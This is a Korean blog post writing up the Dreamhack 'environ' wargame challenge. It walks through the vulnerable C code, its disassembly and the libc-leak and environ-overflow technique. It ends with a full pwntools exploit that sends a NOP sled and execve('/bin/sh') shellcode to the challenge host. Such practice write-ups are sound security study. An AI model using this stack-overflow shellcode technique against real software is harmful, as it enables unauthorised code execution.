---
published: true
image: /img
layout: post
title: Dreamhack 시스템 해킹 environ
tags: [BOB]
math: true
date: 2022-06-26 17:30
---

오랜만에 풀어보는 시스템 해킹이다.

environ을 간단히 설명해보면 프로그램이 동작할 떄 시스템의 환경변수를 참조해야할 경우가 있다. 이때 사용하는 것이 environ 포인터인데 이는 시스템의 환경변수를 가리키며 로더의 초기화 함수에 의해 초기화 된다.

이번 문제의 코드를 살펴보면 다음과 같다
```C++
int main()
{
    char buf[16];
    size_t size;
    long value;
    void (*jump)();

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    printf("Data: ");
    read(0, buf, size);

    printf("*jmp=");
    scanf("%ld", &value);

    jump = *(long *)value;
    jump();

    return 0;
}
```

stdout의 주소값을 출력해주고 입력받은 사이즈 만큼 buf에 쓰고 value의 주소를 정해줘 해당 주소로 점프해 어셈블리 코드를 실행하게 된다. 

바이너리에 걸린 보안 기술을 보면 다음과 같다
```python
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```
stack canary가 적용되어 있지만 이를 체크하기 전에 쉘 코드가 실행되어 크게 신경쓸 부분은 아닌것 같다.

우선 해당 바이너리를 익스하기 위해 stdout주소에서 stdout offset의 차를 구해 libc base주소를 구한다. 이후 해당 libc base주소에 environ offset을 더해 바이너리의 environ주소를 구한다. 다음으로 buf를 오버플로우 시켜 environ 영역에 쉘 코드를 삽입하고 해당 주소로 점프하면 쉘을 구할 수 있다.

main함수의 어셈블리를 살펴보자
```C++
0x000000000040089a <+0>:     push   rbp
   0x000000000040089b <+1>:     mov    rbp,rsp
   0x000000000040089e <+4>:     sub    rsp,0x40
   0x00000000004008a2 <+8>:     mov    rax,QWORD PTR fs:0x28
   0x00000000004008ab <+17>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000004008af <+21>:    xor    eax,eax
   0x00000000004008b1 <+23>:    mov    eax,0x0
   0x00000000004008b6 <+28>:    call   0x40083e <initialize>
   0x00000000004008bb <+33>:    mov    rax,QWORD PTR [rip+0x2007be]        # 0x601080 <stdout@@GLIBC_2.2.5>
   0x00000000004008c2 <+40>:    mov    rsi,rax
   0x00000000004008c5 <+43>:    mov    edi,0x400a0d
   0x00000000004008ca <+48>:    mov    eax,0x0
   0x00000000004008cf <+53>:    call   0x4006a0 <printf@plt>
   0x00000000004008d4 <+58>:    mov    edi,0x400a19
   0x00000000004008d9 <+63>:    mov    eax,0x0
   0x00000000004008de <+68>:    call   0x4006a0 <printf@plt>
   0x00000000004008e3 <+73>:    lea    rax,[rbp-0x38]
   0x00000000004008e7 <+77>:    mov    rsi,rax
   0x00000000004008ea <+80>:    mov    edi,0x400a20
   0x00000000004008ef <+85>:    mov    eax,0x0
   0x00000000004008f4 <+90>:    call   0x400700 <__isoc99_scanf@plt>
   0x00000000004008f9 <+95>:    mov    edi,0x400a24
   0x00000000004008fe <+100>:   mov    eax,0x0
   0x0000000000400903 <+105>:   call   0x4006a0 <printf@plt>
   0x0000000000400908 <+110>:   mov    rdx,QWORD PTR [rbp-0x38]
   0x000000000040090c <+114>:   lea    rax,[rbp-0x20]
   0x0000000000400910 <+118>:   mov    rsi,rax
   0x0000000000400913 <+121>:   mov    edi,0x0
   0x0000000000400918 <+126>:   call   0x4006c0 <read@plt>
   0x000000000040091d <+131>:   mov    edi,0x400a2b
   0x0000000000400922 <+136>:   mov    eax,0x0
   0x0000000000400927 <+141>:   call   0x4006a0 <printf@plt>
   0x000000000040092c <+146>:   lea    rax,[rbp-0x30]
   0x0000000000400930 <+150>:   mov    rsi,rax
   0x0000000000400933 <+153>:   mov    edi,0x400a20
   0x0000000000400938 <+158>:   mov    eax,0x0
   0x000000000040093d <+163>:   call   0x400700 <__isoc99_scanf@plt>
   0x0000000000400942 <+168>:   mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400946 <+172>:   mov    rax,QWORD PTR [rax]
   0x0000000000400949 <+175>:   mov    QWORD PTR [rbp-0x28],rax
   0x000000000040094d <+179>:   mov    rdx,QWORD PTR [rbp-0x28]
   0x0000000000400951 <+183>:   mov    eax,0x0
   0x0000000000400956 <+188>:   call   rdx
   0x0000000000400958 <+190>:   mov    eax,0x0
   0x000000000040095d <+195>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000400961 <+199>:   xor    rcx,QWORD PTR fs:0x28
   0x000000000040096a <+208>:   je     0x400971 <main+215>
   0x000000000040096c <+210>:   call   0x400690 <__stack_chk_fail@plt>
   0x0000000000400971 <+215>:   leave  
   0x0000000000400972 <+216>:   ret 
```

stdout을 통해 libc base 주소를 구하는 것은 어렵지 않다.
pwntools을 이용하면 된다. 출력된 주소 - libc.symbols["_IO_2_1_stdout_"]를 이용하면 쉽게 구할 수 있다. 가장 중요한 것은 buf의 위치와 environ 위치의 offset을 구해야 하는데 gdb 상에서 살펴보면 read 함수에서 받아 저장할 위치는 rbp-0x20이라고 되어있다.

```C++
0x0000000000400908 <+110>:   mov    rdx,QWORD PTR [rbp-0x38]
```

이부분의 주소값과 environ의 주소값의 차를 구하고 쉘코드의 길이를 더한 만큼 오버플로우 시켜야 한다.

그러면 buf와 environ의 offset 만큼의 nop코드로 채운 후 쉘코드를 삽입하고 이로 건너뛰는 시나리오가 될 것이다.

```python
from pwn import *
context.update(arch='amd64', os='linux')

c = remote("host3.dreamhack.games", 17150);
libc = ELF("./libc.so.6")
#c = process("./environ")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

shell = asm(shellcraft.execve("/bin/sh"))

c.recvuntil(b"stdout: ")
stdout = int(str(c.recvline()[:-1]).replace("b", "").replace("'", ''), 16)
print(f"stdout : {hex(stdout)}")

stdoutOffset = libc.symbols["_IO_2_1_stdout_"]
libcBase = stdout-stdoutOffset
print(f"libc base : {hex(libcBase)}")
print(f"libc offset : {hex(stdoutOffset)}")

envAddr = libcBase+libc.symbols["environ"]
print(f"environ addr : {hex(envAddr)}")
bufToenvOffset = 0x148
print(f"Buffer to environ addr offset : {hex(bufToenvOffset)}")

c.recvuntil(b"Size: ")
c.sendline(str(bufToenvOffset+len(shell)))

c.recvuntil(b"Data: ")
c.sendline(b"\x90"*bufToenvOffset+shell)

c.recvuntil(b"*jmp=")
c.sendline(str(envAddr))

c.interactive()
```

위 코드를 통해 익스플로잇이 가능하다. 